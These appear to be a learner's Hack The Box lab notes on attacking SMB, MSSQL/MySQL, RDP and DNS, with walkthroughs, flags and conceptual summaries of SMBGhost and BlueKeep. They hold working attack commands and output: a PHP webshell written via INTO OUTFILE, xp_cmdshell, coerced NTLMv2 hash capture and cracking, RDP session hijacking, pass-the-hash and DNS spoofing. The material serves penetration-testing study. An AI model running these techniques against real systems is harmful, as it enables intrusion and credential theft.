[+] IP: 10.129.203.6:445	Name: 10.129.203.6        	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)

> GGJ

smbmap -H 10.129.203.6 -r GGJ

smbmap -H 10.129.203.6 --download "GGJ\id_rsa"
cat id_rsa

# Download the password list
nxc smb 10.129.87.121 --shares -u jason -p Desktop/passwords/pws.list --local-auth --ignore-pw-decoding
> [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh

nxc smb 10.129.87.121 --shares -u jason -p '34c8zuNBo91!@28Bszh' --local-auth

cat flag.txt
> HTB{SMB_4TT4CKS_2349872359}
```



# Latest SMB Vulnerabilities



## Overview

A recent significant SMB vulnerability was SMBGhost (CVE-2020-0796). affecting a compression mechanism in SMB v3.1.1. It made Windows 10 versions 1903 and 1909 vulnerable to an unauthenticated attacker, allowing remote code execution (RCE) and full access to the target. This section focuses only on the attack concept: a full explanation would require reverse engineering, CPU/kernel, and exploit-development knowledge.

## The Concept of the Attack

At its core, SMBGhost is an integer overflow in an SMB driver function that lets system commands be overwritten while accessing memory.

- An integer overflow happens when a CPU tries to generatea number larger than the allocated memory space can hold. A classic example: a programmer doesn't account for negative numbers, an operation produces one, and the variable wraps around and is returned as a positive integer instead. 
- The bug existed because the function lacked bounds checks to handle the size of data during SMB session negotiation.

The vulnerability triggers when processing a malformed compressed message after the Negotiate Protocol Responses. If the SMB server allows requests over TCP/445, compression is generally supported, and server/client agree on communication terms before more data is sent. If transmitted data exceeds the integer variable's limits, the excess is written into the buffer, overwriting subsequent CPU instructions and interruption normal execution. Crafter data can replace those instructions with the attacker's own, forcing the CPU (and the process) to execute arbirtrary tasks.

## Mapped to the Concept of Attacks



### Part 1 - Initiation of the Attack


| Step | SMBGhost                                                                         | Category    |
| ---- | -------------------------------------------------------------------------------- | ----------- |
| 1    | Client sends an attacker-manipulated request to the SMB server                   | Source      |
| 2    | Compressed packets are processed per the negotiated protocol responses           | Process     |
| 3    | Processing runs with SYSTEM (or at least administrator) privileges               | Privileges  |
| 4    | The local process tasked with handling the compressed packets is the destination | Destination |


The cycle then restarts to gain remote access.

### Part 2 - Trigger Remote Code Execution


| Step | SMBGhost                                                                                                               | Category    |
| ---- | ---------------------------------------------------------------------------------------------------------------------- | ----------- |
| 5    | Sources for the second cycle come from the previous process                                                            | Source      |
| 6    | The **integer overflow** occurs — the overwritten buffer is replaced with attacker instructions, forcing CPU execution | Process     |
| 7    | The same SMB server privileges are used                                                                                | Privileges  |
| 8    | The remote attacker system is the destination, granting access to the local system                                     | Destination |




## Key Takeaways

- Despite the exploit's real-world complexity (buffer manipulation, seen in the PoC), the Concept of Attacks pattern still applies - the same Source -> Process -> Privileges -> Destionation loop, run twice, that you saw with Log4j and CoreFTP.
- The root cause is a missing bounds check leading to an integer overflow during SMB negotiation -  a memory-safety class of bug, distinct from the misconfiguration/credential attacks earlier in the module.
- Unauthenticated + SYSTEM-level RCE is what made this critical: no credentials needed, highest privileges gained.
- If you want the underlying mechanics, the module points to the Stack-Based Buffer Overflows (Linux x86 / Windows x86) modules - worth queuing given your CPTS path, since buffer-overflow fundamentals underpin this whole vulnerability class.



# Attacking SQL Databases



## Overview

MySQL and Microsoft SQL Server (MSSQL) are relational database management systems storing data in tables, columns, and rows, both using SQL to query and maintain data. Database hosts are high-value targets (they store credentials, PII, business data, and payment info), and often run with highly privileged users you can leverage for lateral movement and privilege escalation.

## Enumeration

Default ports: MSSQL -> TCP/1443 (and UDP/1434; TCP/2433 in "hidden" mode); MySQL -> TCP/3306

```bash
nmap -Pn -sV -sC -p1433 10.10.10.125
```

Reveals version, hostname, and domain info (via `ms-sql-ntlm-info`, `ms-sql-info`) for identifying misconfigs and known vulns.

## Authentication Mechanisms

MSSQL supports two modes:

- Windows authentication: Default ("integrated security"); tightly tied to Windows/AD. Already-authenticated Windows users need no extra credentials.
- Mixed mode: Supports both Windows/AD accounts and SQL Server username/password pairs maintained inside SQL Server.

MySQL supports username/password and (via plugin) Windows auth. A notable past flaw (CVE-2012-2122 in MySQL 5.6.x) allowed authentication bypass via a timing attack: repeatedly submitting the same wrong password eventually returned success, because the server's response timing leaked when the correct password was found.

## Misconfigurations & Privileges

Misconfigured auth grants access with no credentials if anonymous access is enabled, a user has no password, or any user/group/machine is allowed to connect. 

Depending on privileges, you may: read/change database contents, read/change server config, execute commands, read local files, communicate with other databases, caputre the local system hash, impersonate users, and gain access to other networks.

## Read/Change the Database - Connecting



### MySQL:

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```



### MSSQL - sqlcmd (Windows)

```cmd
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

(`-y`/`-Y` improve output formatting).

### MSSQL - sqsh (Linux)

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

(`-h` disables headers/footers).

### MSSQL - Impacket

```bash
mssqlclient.py -p 1433 julio@10.129.203.7
```

Windows vs SQL auth: specifying a domain/hostname triggers Windows Authentication; omitting it assumes SQL Authentication. For a local account use `SERVERNAME\accountname` or  `.\accountname`:

```bash
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```



## Default Databases (used for enumeration)

MySQL: `mysql`, `information_schema` (metadata), `performance_schema`, `sys`.
MSSQL: `master`, `msdb`, `model`, `resource`, `tempdb`.

## SQL Syntax (note: MSSQL needs `GO` to execute)


| Action          | MySQL                  | MSSQL                                                       |
| --------------- | ---------------------- | ----------------------------------------------------------- |
| List databases  | `SHOW DATABASES;`      | `SELECT name FROM master.dbo.sysdatabases`                  |
| Select database | `USE htbusers;`        | `USE htbusers`                                              |
| List tables     | `SHOW TABLES;`         | `SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES` |
| Dump a table    | `SELECT * FROM users;` | `SELECT * FROM users`                                       |




## Execute Commands

MSSQL - `xp_cmdshell` (an extended stored procedure; disabled by default). The spawned Windows process runs with the SQL Server service account's rights and operates synchronously:

```cmd
1> xp_cmdshell 'whoami'
2> GO
```

Enable it (with privileges):

```python
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
GO
```

Other MSSQL execution methods exist (CLR assemblies, Agent Jobs, external scripts, `xp_regwrite` for privesc) - out of scope here.

MySQL has no `xp_cmdshell` but supports User Defined Fuctions (UDFs) to run C/C++ as a SQL function (uncommon in production).

## Write Local Files

MySQL - write a webshell into a web root, then browse to it:

```bash
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

Governed by `secure_file_priv`: empty = no restriction (insecure, allows read/write); a directory = limited to that path; `NULL` = import/export disabled. Requires the FILE privilege. Check it:

```bash
mysql> show variables like "secure_file_priv";
```

MSSQL - requires enabling Ole Automation Procedures (admin), then use `sp_OACreate`/`sp_OAMethod` to write a file.

## Read Local Files

MSSQL (reads any file the account can access, by default):

```bash
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

MySQL (needs correct settings + privileges):

```bash
mysql> select LOAD_FILE("/etc/passwd");
```



## Capture MSSQL Service Hash

Steal the SQL service account's NTLMv2 hash using the undocumented `xp_dirtree` or `xp_subdirs` procedures, which force SMB authentication to your server. Start a listener first (Responder or `impacket-smbserver`):

```cmd
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

```bash
$ sudo responder -I tun0
# or
$ sudo impacket-smbserver share ./ -smb2support
```

Then crack or relay the captured hash.

## Impersonate Users (MSSQL)

The IMPERSONATE permission lets you assume another user/login's permissions. Sysadmins can impersonate anyone; other users need explicit grants.

Find who you can impersonate

```cmd
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

Check your current role:

```cmd
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')   -- 0 = not sysadmin
```

Impersonate (e.g., `sa`) to gain sysadmin (`1`):

```cmd
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
```

Run `EXECUTE AS LOGIN` from the master DB (all users have access). Use `REVERT` to return to your original user.

## Communicate with Linked Servers (MSSQL)

Linked servers let the engine run Transact-SQL against another SQL Server or product (e.g., Oracle). If the linked-server credentials have sysadmin, you may execute commands remotely and move laterally.

Identify them:

```cmd
SELECT srvname, isremote FROM sysservers
GO
```

(`isremote`: `1` = remote server, `0` = linked server.)

Send pass-through commands with `EXECUTE(...) AT [linked_server]`:

```cmd
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```

(Escape single quotes by doubling them; separate multiple commands with `;`.) With sysadmin on the linked server, you control that instance — read any DB or run `xp_cmdshell`.

## Key Takeaways

- Databases are privileged pivots, not just data stores - the goal is usually command execution (`xp_cmdshell`), file read/write (webshell), or hash capture, then lateral movement.
- This ties directly to your current box: `ATTCSVC` is the Attacking Common Services database target - jason's reused password is likely your login to MSSQL/MySQL, where the real objective lives.
- `xp_dirtree`/`xp_subdirs` hash stealing is the same Responder/ntlmrelayx primitive from the SMB section - MSSQL just becomes another way to coerce authentication, exactly like the coercion techniques in your recent AD CS/ESC8 work.
- IMPERSONATE -> `sa` -> sysadmin and linked servers are the two classic MSSQL privesc/lateral paths - always check `IS_SRVROLEMEMBER('sysadmin')` and `sysservers` after any successful login.
- On MySQL, always check `secure_file_priv` before attempting `INTO OUTFILE` - an empty value is your green light for a webshell write.



## Connect to HTB



#### What is the password for the "mssqlsvc" user?

Authenticate to 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02), with user "htbdbuser" and password "MSSQLAccess01!"

```bash
mssqlclient.py -p 1433 htbdbuser@10.129.203.12

SELECT name FROM master.dbo.sysdatabases
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT name FROM flagDB.sys.tables

sudo $(which python3) smbserver.py share ./ -smb2support
```

```cmd
SQL (htbdbuser  guest@master)> EXEC master..xp_dirtree '\\10.10.17.216\share\'
subdirectory   depth   
------------   -----   
SQL (htbdbuser  guest@master)> 
```

```bash
#Terminal A
sudo $(which python3) Responder/Responder.py -I tun0

# Terminal B
EXEC master..xp_dirtree '\\10.10.17.216\share\'

# Terminal A
[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:116e358e7d5970da:6F2B1FC75721BB75ADFBC723F3215B75:010100000000000080CEAA0DAC22DD012015C6EC62C794DB00000000020008004C0051005200340001001E00570049004E002D003000450049003400450041004700350049004800530004003400570049004E002D00300045004900340045004100470035004900480053002E004C005100520034002E004C004F00430041004C00030014004C005100520034002E004C004F00430041004C00050014004C005100520034002E004C004F00430041004C000700080080CEAA0DAC22DD01060004000200000008003000300000000000000000000000003000008B0D7EFC6C0F4B43762B0F8692DB69E343CC533C8004BBADE23FED2F2738E1650A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003200310036000000000000000000

> mssqlsvc::WIN-02:116e358e7d5970da:6F2B1FC75721BB75ADFBC723F3215B75:010100000000000080CEAA0DAC22DD012015C6EC62C794DB00000000020008004C0051005200340001001E00570049004E002D003000450049003400450041004700350049004800530004003400570049004E002D00300045004900340045004100470035004900480053002E004C005100520034002E004C004F00430041004C00030014004C005100520034002E004C004F00430041004C00050014004C005100520034002E004C004F00430041004C000700080080CEAA0DAC22DD01060004000200000008003000300000000000000000000000003000008B0D7EFC6C0F4B43762B0F8692DB69E343CC533C8004BBADE23FED2F2738E1650A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003200310036000000000000000000

hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
MSSQLSVC::WIN-02:116e358e7d5970da:6f2b1fc75721bb75adfbc723f3215b75:010100000000000080ceaa0dac22dd012015c6ec62c794db00000000020008004c0051005200340001001e00570049004e002d003000450049003400450041004700350049004800530004003400570049004e002d00300045004900340045004100470035004900480053002e004c005100520034002e004c004f00430041004c00030014004c005100520034002e004c004f00430041004c00050014004c005100520034002e004c004f00430041004c000700080080ceaa0dac22dd01060004000200000008003000300000000000000000000000003000008b0d7efc6c0f4b43762b0f8692db69e343cc533c8004bbade23fed2f2738e1650a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310037002e003200310036000000000000000000:princess1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MSSQLSVC::WIN-02:116e358e7d5970da:6f2b1fc75721bb75a...000000
Time.Started.....: Sun Aug  2 18:27:34 2026 (0 secs)
Time.Estimated...: Sun Aug  2 18:27:34 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   908.8 kH/s (7.16ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344384 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> total90
Hardware.Mon.#1..: Temp: 47c Util: 20%

Started: Sun Aug  2 18:27:32 2026
Stopped: Sun Aug  2 18:27:36 2026

> princess1
```



#### Enumerate the "flagDB" database and submit a flag as your answer.

```bash
mssqlclient.py WIN-02/mssqlsvc:'princess1'@10.129.203.12 -windows-auth
USE flagDB
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
SELECT * FROM flagDB.dbo.tb_flag
flagvalue                           
---------------------------------   
HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}   

> HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
```



# Latest SQL Vulnerabilities



## Overview

This sections covers a "vulnerability" with no CVE and no direct exploit, it abuses legitimate funcionality. As the previous section showed, you can obtain NTLMv2 hashes by interacting with the MSSQL server. This works both through a direct connection to MSSQL and through vulnerable web applications; this sections focuses on the simpler direct-interaction variant.

## The Concept of the Attacl

It centers on the undocumented MSSQL function `xp_dirtree`, which views the contents of a folder (local or remote) and accepts parameters like depth (how far to recurse) and the target folder.

The key insight: `xp_dirtree` isn0t a vulnerability in itself - it abuses the SMB authentication mechanism. When a Windows host tries to acces a network share, it automatically sends an NTLMv2 hash for authentication. By pointing `xp_dirtree` at an attacker-controlled share, you force the MSSQL service account to authenticate to you and leak its hash.

What you can do with the captured hash:

- **Crack it** locally to recover the cleartext password (what you just did with `mssqlsvc` → `princess1`).
- **SMB Relay attack** — "replay" the hash to log into *other* systems where the account has local admin.



## Mapped to the Concept of Attacks



### Part 1 - Initiation of the Attack


| Step | XP_DIRTREE                                                                         | Category    |
| ---- | ---------------------------------------------------------------------------------- | ----------- |
| 1    | User input specifies the function and the network shared folder                    | Source      |
| 2    | Process should display all contents of the specified folder                        | Process     |
| 3    | Executing commands on MSSQL requires the elevated privileges the service runs with | Privileges  |
| 4    | The SMB service is the destination the request is forwarded to                     | Destination |


The cycle then **restarts** to obtain the NTLMv2 hash of the MSSQL service user.

### Part 2 - Steal the Hash


| Step | Stealing the Hash                                                            | Category    |
| ---- | ---------------------------------------------------------------------------- | ----------- |
| 5    | The SMB service receives the order info from the previous MSSQL process      | Source      |
| 6    | Data is processed and the specified folder is queried for contents           | Process     |
| 7    | The MSSQL service account's authentication hash is used to query the service | Privileges  |
| 8    | The destination is the attacker-controlled host and its network share        | Destination |




## Capturing the Hash

The leaked hash is intercepted by tools like Responder, Wireshark, or tcpdump and displayed for use. Other MSSQL command-execution methods exist too (e.g., running Python code inside a SQL query), covered in other modules.

## Key Takeaways

- This is **exactly the attack you just executed** end-to-end: `xp_dirtree` → coerced `mssqlsvc` NTLMv2 hash → captured with tcpdump/smbserver → cracked to `princess1` → reconnected as the privileged service account to reach `flagDB`. The theory here is the retroactive explanation of your lab.
- The power isn't in `xp_dirtree` — it's in **SMB's automatic NTLM authentication**. Any function that touches a remote path (`xp_dirtree`, `xp_subdirs`) becomes a coercion primitive. This is the same mechanism as Responder poisoning and the AD CS/ESC8 relay work from your CPTS path — coerce auth, then crack or relay.
- **Crack vs. relay** are the two branches: you cracked here, but remember relay (`ntlmrelayx`) for when the hash won't crack — with the caveat that you can't relay back to the originating host (Microsoft patched that).
- That tcpdump RST-then-retry saga you fought through is worth a note in your Obsidian vault: when a coercion connects but resets mid-negotiation, retrying the trigger or swapping the listener is the fix — the callback *was* arriving, which the packet capture proved.



# Attacking RDP



## Overview

RDP (Remote Desktop Protocol) is Microsoft's proprietary protocol providing a graphical interface to connect to another computer over a network. It's a hugely popular admin tool (used by sysadmins and MSPs to manage remote systems as if on-site) which also makes it a valuable attack gateway. Default port: TCP/3389.

```bash
nmap -Pn -p3389 192.168.2.143
# 3389/tcp open ms-wbt-server
```



## Misconfigurations: Password Guessing

Since RDP authenticates with credentials, password guessing is a common vector (occasionally you'll even find a misconfigured passwordless RDP). Min the client's password policy (accounts lock after too many failures) so prefer password spraying (one password across many usernames) over brute forcing.

### Crowbar:

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# RDP-SUCCESS : administrator:password123
```



### Hydra

RDP dislikes many parallel connections: use `-t 1`/`-t 4`, `-W` to throttle

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```



### Logging in with valid creds

We can use `rdesktop` or `xfreerdp`

```bash
rdesktop -u admin -p password123 192.168.2.143
```



## Protocol Specific Attacks



### RDP Session Hijacking

If you compromise a machine with local admin and another user is connected via RDP, you can hijack their session to impersonate them in AD, potentially taking over a Domain Admin.

To impersonate without a password, you need SYSTEM privileges and Microsoft's `tscon.exe` (conntects to another desktop sesion by SESSION ID):

```cmd
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

A reliable way to get SYSTEM: create a Windows service (services run as Local System by default) with `sc.exe` to run `tscon` against the target session:

```cmd
C:\htb> query user
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
C:\htb> net start sessionhijack
```

Starting the service spawns a terminal as the hijacked user. Note: this method no longer works on Server 2019.

### RDP Pass-the-Hash (PtH)

When you need GUI access but only have a user's NT hash (e.g., dumped from SAM, uncrackable), you can sometimes RDP in with just the hash via `xfreerdp /pth`.

#### Caveats

- Requires Restricted Admin Mode enabled on the target (disabled by default) or you'll hit an "account restrictions" error. Enable via registry:

```cmd
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

- Then pass the hash:

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

It won't work against every system, but it's always worth trying when you have an NT hash, the user has RDP rights, and GUI access advances your goal.

## Key Takeaways

- Password spraying beats brute forcing on RDP too (same lockout logic as SMB, and RDP additionally chokes on parallel connections, throttle Hydra with `-t`/`-W`).
- Session hijacking is a local-admin -> SYSTEM -> impersonation chain; the `sc.exe create` service trick is the clean way to reach SYSTEM, but remember it's dead on Server 2019+.
- RDP PtH extends Pass-the-Hash (same primitive from your SMB/AD work) into GUI access, but it's gated on `DisableRestrictedAdmin`, so it's situational, not guaranteed.
- Practical note for your setup: `xfreerdp` is the tool you'll use for both PtH and normal login, and your own environment fixes apply (add `/cert:ignore /timeout:20000 +auto-reconnect` and single-quote passwords with special characters to avoid the connection errors you've hit before).



## Connect to HTB



#### What is the name of the file that was left on the Desktop? (Format example: filename.txt)

```bash
xfreerdp /v:10.129.90.219 /u:htb-rdp /p:'HTBRocks!'

> pentest-notes.txt
```



#### Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
> DisableRestrictedAdmin
```



#### Connect via RDP with the Administrator account and submit the flag.txt as you answer.

```bash
xfreerdp /v:10.129.90.219 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824

HTB{RDP_P4$$_Th3_H4$#}
```



# Latest RDP Vulnerabilities



## Overview

In 2019, a critical RCE vulnerability was published in RDP (TCP/3389) CVE-2019-0708, known as BlueKeep. It's pre-authentication (requires no prior access or credentials), which is what makes it so dangerous, and it has driven, and still drives, many malware and ransomware attacks. Organizations running legacy software locked to specific versions (e.g., hospitals) are especially exposed, since maintaining that infrastructure is costly.

## The Concept of the Attack

Like the SMB vulnerability, BlueKeep is based on manipulated requests sent to the service. The critical difference: it triggers without user authentication. The flaw occurs rights after connection initialization, when basic settings are exchanged between client and server.

It's a Use-After-Free (UAF) vulnerability: it exploits freed memory to execute arbitrary code. After the function is exploited and memory is freed, data is wirtten into the kernel, overwriting kernel memory. The attacker uses that freed memory to place their own instructions and have the CPU execute them.

## Mapped to the Concept of Attacks



### Part 1: Initiation of the Attack


| Step | BlueKeep                                                                                     | Category    |
| ---- | -------------------------------------------------------------------------------------------- | ----------- |
| 1    | Attacker-manipulated initialization request in the client/server settings exchange           | Source      |
| 2    | Request reaches a function used to create a **virtual channel** containing the vulnerability | Process     |
| 3    | Because the service administers the system, it runs with **LocalSystem** privileges          | Privileges  |
| 4    | The manipulated function redirects to a kernel process                                       | Destination |




The cycle then restarts to gain remote access.

### Part 2: Trigger Remote Code Execution


| Step | BlueKeep                                                                          | Category    |
| ---- | --------------------------------------------------------------------------------- | ----------- |
| 5    | Attacker payload inserted to free kernel memory and place instructions            | Source      |
| 6    | Kernel process triggered to free memory and point the CPU at the attacker's code  | Process     |
| 7    | Kernel runs with highest privileges, so instructions execute with **LocalSystem** | Privileges  |
| 8    | Executed instructions send a **reverse shell** over the network to the attacker   | Destination |


## Prevalence & Warning

Not all newer Windows versions are vulnerable; Microsoft released patches for current and many out-of-support versions. Still, an initial May 2019 scan found ~950.000 vulnerable systems, and roughly a quarter remain vulnerable today.

> Critical caution: BlueKeep exploitation can cause system instability, including a Blue Screen of Death (BSoD). Be careful before running the exploit, when in doubt, discuss the risks with the client firts and let them decide whether you should run it.

## Key Takeaways

- BlueKeep is pre-auth kernel RCE at LocalSystem, the most severe combination possible (no credentials, highest privileges), which is why it's a recurring real-world ransomware vector.
- Same Source -> Process -> Privileges -> Destination loop-twice pattern as SMBGhost and Log4j, different bug class (Use-After-Free vs. integer overflow vs. logic  flaw), identical conceptual structure.
- The professional/engagement lesson matters as much as the technical one: exploits that risk BSoD or downtine require client consultation and consent first. That's a scoping/rules of engagement point worth carrying into your CPTS exam and real assessments, knowing when not to fire an exploit is part of the job.
- Unlike the misconfiguration and credential attacks earlier in this module, BlueKeep is a memory-corruption exploit, you'd typically reach for a tested module (e.g., Metasploit) rather than hand-craft it, and verify the target build first given the instability risk.

# Attacking DNS
## Overview
DNS translates domain names (e.g., `hackthebox.com`) into IP addresses (e.g., `104.17.42.72`). It runs mostly on UDP/53 by default but falls back to TCP/53 by default but falls back to TCP/53 when a packet is too large for a single UDP packet (increasingly relied upon over time). Since nearly all network applications depend on DNS, attacks against DNS servers are among the most prevalent and significant threats.

## Enumeration
DNS reveals how a company operates and what services it provides (including third parties like email hosts). Scan with Nmap:
```bash
nmap -p53 -Pn -sV -sC 10.10.110.213
# 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2
```

## DNS Zone Transfer
A DNS zone is a portion of the namespace managed by an organization. Servers use zone transfers to copy database portions toother servers. If misconfigured (not limiting which IPs can request transfers), anyone can request a full copy, zone transfers require no authentication. Normally UDP, but zone transfers use TCP for reliable transmission.

This leaks the organization's entire DNS namespace, expanding the attack surface. Dump it with `dig` using query type AXFR:
```bash
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

Reveals subdomains like `admin`, `hr`, `support` with their A records. Fierce automates finding nameservers and attempting transfers:
```bash
fierce --domain zonetransfer.me
```

## Domain & Subdomain Takeovers
Domain takeover = registering a non-existent/expired domain to gain control, then hosting malicious content or phishing under its name.

Subdomain takeover exploits CNAME records. Organizations point subdomains to third-party services (AWS, GitHub, Akamai, Fastly, CDNs) via CNAME:
```bash
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

If `anotherdomain.com` expires and the CNAME still points to it, anyone who registers it controls `sub.target.com` until the DNS record is fixed. 

### Subdomain Enumeration
Enumerate first, then asses for takeover:
- Subfinder: Scrapes open sources like DNSdumpster:
```bash
./subfinder -d inlanefreight.com -v
```

- Sublist3r: Brute-forces subdomains from a wordlist.
- Subbrute: Pure DNS brute-forcing with self-defined resolvers; useful for internal pentest on hosts with no internet access (e.g., after pivoting to an internal host):
```bash
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

Then check CNAMEs with `host` or `nslookup`:
```bash
# host support.inlanefreight.com
# → support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

A `NoSuchBucket` error at that URL signals a potential S3 subdomain takeover, claim it by creating an AWS S3 bucket with the same name. The can-i-take-over-xyz repo documents which services are vulnerable and how to assess them-

## DNS Spoofing (Cache Poisoning)
Altering legitimate DNS records with false info to redirect traffic to a fraudulent site. Attack paths:
- MITM: Intercept user <-> DNS-server communication to route the user to a fake destination.
- Exploiting a DNS server vuln to modify records directly.

### Local DNS Cache Poisoning (Ettercap)
On a local network, use MITM tools like Ettercap or Bettercap:
1. Edit `/etc/ettercap/etter.dns` to map the target domain to the attacker's IP:
```bash
	inlanefreight.com      A   192.168.225.110
   *.inlanefreight.com    A   192.168.225.110
```

2. Scan for live hosts (Host > Scan for Hosts).
3. Set the victim IP as Target1, the default gateway as Target2,
4. Activate the dns_spoof plugin (Plugin > Manage Plugins).
Now when the victim visits `inlanefreight.com`, they're redirected to the attacker's fake page (`192.168.225.110`), confirmed by the victim's `ping` resolving to the spoofed IP.

## Key Takeaways
- Zone Transfers (AXFR) are the highest-value, no-auth DNS win, always try `dig AXFR` early; a misconfigured server hands you the entire namespace and dramatically expands your attack surface, 
- Subdomain takeover is an enumerate-then-verify chain: Subfinder/Sublist3r/Subbrute to list subdomains -> check CNAMEs -> look for dangling records (`NoSuchBucket`, etc.). Subbrute is your go-to when working internally post-pivot with no internet access.
- DNS spoofing is local-network/MITM attack, relevant when you already have a network position, trying into the same MITM/poisoning family as Responder from the SMB section (poisoning name resolution to redirect victims).
- This section is lighter on the "get RCE" payoff and heavier on reconnaissance and redirection, DNS is mostly about expanding attack surface and enabling downstream attacks (phishing, credential capture) rather than direct compromise.

## Connect to HTB
#### Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.

```bash
dig axfr inlanefreight.htb @10.129.91.3

; <<>> DiG 9.18.39-0ubuntu0.24.04.5-Ubuntu <<>> axfr inlanefreight.htb @10.129.91.3
;; global options: +cmd
; Transfer failed.


dig all inlanefreight.htb @10.129.91.3

; <<>> DiG 9.18.39-0ubuntu0.24.04.5-Ubuntu <<>> all inlanefreight.htb @10.129.91.3
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 44591
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;all.				IN	A

;; Query time: 1 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
;; WHEN: Tue Aug 04 11:46:35 -04 2026
;; MSG SIZE  rcvd: 32

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22247
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 276f393ed834d446010000006a72094a03e46f557caea87b (good)
;; QUESTION SECTION:
;inlanefreight.htb.		IN	A

;; AUTHORITY SECTION:
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800

;; Query time: 303 msec
;; SERVER: 10.129.91.3#53(10.129.91.3) (UDP)
;; WHEN: Tue Aug 04 11:46:36 -04 2026
;; MSG SIZE  rcvd: 115

sudo nano /etc/hosts
inlanefreight.htb 10.129.203.6

gobuster dns -d inlanefreight.htb -r 10.129.91.3 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

Found: ns.inlanefreight.htb
Found: helpdesk.inlanefreight.htb
Found: control.inlanefreight.htb

dig all ns.inlanefreight.htb @10.129.203.6
dig all helpdesk.inlanefreight.htb @10.129.203.6
dig all control.inlanefreight.htb @10.129.203.6

dig axfr ns.inlanefreight.htb @10.129.203.6
dig axfr helpdesk.inlanefreight.htb @10.129.203.6
dig axfr control.inlanefreight.htb @10.129.203.6

echo “10.129.203.6 ns1.inlanefreight.htb” | sudo tee -a /etc/hosts
git clone https://github.com/TheRook/subbrute.git
cd subbrute
echo “ns1.inlanefreight.htb” > ./resolvers.txt
./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
> hr.inlanefreight.htb

dig axfr @10.129.203.6 hr.inlanefreight.htb

HTB{LUIHNFAS2871SJK1259991}
```